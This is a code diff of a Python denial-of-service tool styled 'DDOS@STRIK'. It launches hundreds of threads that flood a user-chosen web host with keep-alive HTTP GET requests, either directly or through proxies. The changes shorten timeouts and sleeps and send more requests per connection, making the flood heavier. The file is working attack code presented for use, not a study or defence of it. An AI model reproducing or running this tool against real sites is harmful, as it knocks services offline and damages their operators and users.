@@ -18,36 +18,37 @@ def show_logo():
 
 def is_valid_url(url):
     pattern = re.compile(r'^(?:http|ftp)s?://(?:(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+(?:[A-Z]{2,6}\.?|[A-Z0-9-]{2,}\.?)|localhost|\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})(?::\d+)?(?:/?|[/?]\S+)$', re.IGNORECASE)
-    check_url = url if "://" in url else "http://" + url
-    return re.match(pattern, check_url) is not None
+    return re.match(pattern, url) is not None
 
 show_logo()
 
-print(f"{D} Quick cmd: DDOS [url] t [threads] s [port]{RESET}")
+print(f"{D} Quick cmd: [url] t [threads] s [port]{RESET}")
 raw_input = input(f"{R}DDOS{G}@{W}STRIK{D}$ {RESET}").strip()
 if not raw_input: sys.exit()
 
-target_url, thread_count, custom_port = "", 800, None
-parts = raw_input.split()
-if parts[0].upper() == "DDOS":
-    if len(parts) > 1: target_url = parts[1]
-    if "t" in parts:
-        try: thread_count = int(parts[parts.index("t") + 1])
-        except: pass
-    if "s" in parts:
-        try: custom_port = int(parts[parts.index("s") + 1])
-        except: pass
-else: target_url = parts[0]
+target_url = raw_input.split()[0]
+thread_count = 800
+use_ssl = target_url.startswith("https")
+custom_port = 443 if use_ssl else 80
+
+t_find = re.search(r't\s*(\d+)', raw_input, re.IGNORECASE)
+if t_find: thread_count = int(t_find.group(1))
+
+s_find = re.search(r's\s*(\d+)', raw_input, re.IGNORECASE)
+if s_find: custom_port = int(s_find.group(1))
 
 if not is_valid_url(target_url):
     print(f"\n{R}[!] ERROR: Invalid URL!{RESET}"); sys.exit()
 
-use_ssl = target_url.startswith("https")
-port = custom_port if custom_port else (443 if use_ssl else 80)
 url_clean = target_url.replace("http://", "").replace("https://", "")
 target, path = url_clean.split("/")[0], "/" + "/".join(url_clean.split("/")[1:]) if "/" in url_clean else "/"
 
 print(f"{D} ----------------------------------- {RESET}")
+print(f"{W} TARGET      : {Y}{target}{RESET}")
+print(f"{W} THREADS (t) : {G}{thread_count}{RESET}")
+print(f"{W} PORT    (s) : {G}{custom_port}{RESET}")
+print(f"{D} ----------------------------------- {RESET}")
+
 print(f"{G}[1] STRIKE {R}[2] EXPLOIT {D}(Normal Mode){RESET}")
 print(f"{G}[3] STRIKE {R}[4] EXPLOIT {D}(Proxy Mode){RESET}")
 choice = input(f"{C}MODE > {RESET}")
@@ -67,46 +68,47 @@ count_lock, stop_event = threading.Lock(), threading.Event()
 def attack(mode):
     global sent_count
     while not stop_event.is_set():
+        now = time.strftime("%H:%M")
         try:
-            now = time.strftime("%H:%M")
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.settimeout(4)
+            s.settimeout(1.5)
             
             if mode in ['3', '4']:
                 p_h, p_p = random.choice(proxies).split(":")
                 s.connect((p_h, int(p_p)))
-                s.send(f"CONNECT {target}:{port} HTTP/1.1\r\n\r\n".encode())
+                s.send(f"CONNECT {target}:{custom_port} HTTP/1.1\r\n\r\n".encode())
             else:
                 if use_ssl: s = ssl.create_default_context().wrap_socket(s, server_hostname=target)
-                s.connect((target, port))
+                s.connect((target, custom_port))
             
-            # --- ปรับ URL Domain เป็นเหลือง, Path เป็นเทาเข้ม และ OK เป็นเหลือง ---
-            log_msg = f"{Y}>>{RESET} {R}({now}){RESET} {M}|{RESET} {R}{sent_count:06d}{RESET} {M}|{RESET} {R}->{RESET} {Y}{target}{RESET}{D}{path}{RESET} {M}|{RESET} {Y}OK{RESET}\n"
-
             req = f"GET {path} HTTP/1.1\r\nHost: {target}\r\nConnection: keep-alive\r\n\r\n"
-            for _ in range(15):
+            for _ in range(20):
                 if stop_event.is_set(): break
                 s.send(req.encode('ascii'))
                 with count_lock:
                     sent_count += 1
+                    # LOG เมื่อสำเร็จ (สีปกติ)
+                    log_msg = f"{Y}>>{RESET} {R}({now}){RESET} {M}|{RESET} {R}{sent_count:06d}{RESET} {M}|{RESET} {R}->{RESET} {Y}{target}{RESET}{D}{path}{RESET} {M}|{RESET} {Y}OK{RESET}\n"
                     if not stop_event.is_set():
                         sys.stdout.write(log_msg)
             s.close()
         except:
             if not stop_event.is_set():
-                sys.stdout.write(f"{Y}>>{RESET} {R}({time.strftime('%H:%M')}){RESET} {R}!!{RESET}\n")
-            time.sleep(0.1)
+                # LOG เมื่อพลาด (แดงทั้งบรรทัดตามสั่ง)
+                error_msg = f"{R}>> ({now}) | {sent_count:06d} | -> {target}{path} | !!{RESET}\n"
+                sys.stdout.write(error_msg)
+            time.sleep(0.05)
 
 print(f"{D} ----------------------------------- {RESET}")
 try:
     for i in range(thread_count):
         threading.Thread(target=attack, args=(choice,), daemon=True).start()
-    while True: time.sleep(0.5)
+    while not stop_event.is_set(): 
+        time.sleep(0.5)
 except KeyboardInterrupt:
     stop_event.set()
     duration = round(time.time() - start_time, 2)
     avg_speed = round(sent_count / duration, 2) if duration > 0 else 0
-    
     print(f"\r{RESET}")
     print(f"{D}-----------------------------------{RESET}")
     print(f"{R}[!] SESSION TERMINATED{RESET}")
